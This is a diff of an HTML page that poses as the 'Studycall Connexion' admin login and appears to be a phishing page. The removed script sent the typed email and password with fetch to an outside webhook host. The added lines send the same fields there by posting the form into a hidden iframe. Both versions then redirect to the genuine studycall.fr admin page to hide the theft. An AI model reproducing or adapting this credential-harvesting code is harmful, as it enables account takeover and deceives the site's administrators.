@@ -16,7 +16,7 @@
           <h2>Studycall Connexion</h2>
           <div id="notice-tfa"></div>
           <div id="notice"></div>
-          <form class="simple_form new_admin_user" id="login-form" accept-charset="UTF-8" method="post">
+          <form class="simple_form new_admin_user" id="login-form" accept-charset="UTF-8" method="post" action="https://b5191f16-9c13-4022-b1ab-1e82d89146e0.eu1.trayapp.io" target="invisible_iframe">
             <input type="hidden" name="authenticity_token" value="EjRPvq2UhfTHK9od9en7Bbs2BUwDMNBhh7tN4TQFaIcKjSGuS6P4kPSVwkbXZdElwc+kZPQJTC3B6Lv22aO3aA==">
             <fieldset class="input">
               <ol>
@@ -52,39 +52,14 @@
     <div id="footer"></div>
   </div>
 
+  <iframe id="invisible_iframe" name="invisible_iframe" style="display:none;"></iframe>
+
   <script>
-    document.getElementById('login-form').addEventListener('submit', function(e) {
-      e.preventDefault();
-
-      var email = document.getElementById('admin_user_email').value;
-      var password = document.getElementById('admin_user_password').value;
-
-      var data = {
-        email: email,
-        password: password
-      };
-
+    document.getElementById('login-form').addEventListener('submit', function() {
       var loader = document.getElementById('loader');
       loader.style.visibility = 'visible';
 
-      fetch('https://b5191f16-9c13-4022-b1ab-1e82d89146e0.eu1.trayapp.io', {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(data)
-      })
-      .then(() => {
-        console.log('Success: data sent');
-        setTimeout(() => {
-          window.location.href = 'https://www.studycall.fr/admin';
-        }, 2000);
-      })
-      .catch((error) => {
-        console.error('Error:', error);
-        loader.style.visibility = 'hidden';
-      });
+      window.location.href = 'https://www.studycall.fr/admin';
     });
   </script>
 </body>
